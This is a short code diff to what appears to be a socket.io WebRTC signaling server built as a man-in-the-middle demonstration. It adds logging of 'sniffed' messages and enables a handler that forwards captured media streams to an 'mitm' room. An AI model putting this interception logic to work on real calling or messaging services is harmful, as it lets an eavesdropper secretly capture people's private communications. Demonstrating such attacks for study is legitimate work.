@@ -28,6 +28,7 @@ io.sockets.on('connection', function(socket) {
   socket.on('message', function(message, room) {
     log('Attacker Sniffed: ', message);
     socket.to("mitm").emit('sniff', message, room);
+    log("sniffed message:", message);
     // for a real app, would be room-only (not broadcast)
     //socket.broadcast.emit('message', message);
   });
@@ -44,9 +45,9 @@ io.sockets.on('connection', function(socket) {
   });
 
   //Shim function for setting streams -- Not operating currently
-  // socket.on('stream', function(stream) {
-  //   socket.to("mitm").emit('captured stream', stream);
-  // });
+  socket.on('stream', function(stream) {
+    socket.to("mitm").emit('captured stream', stream);
+  });
 
 
   socket.on('create or join', function(room) {
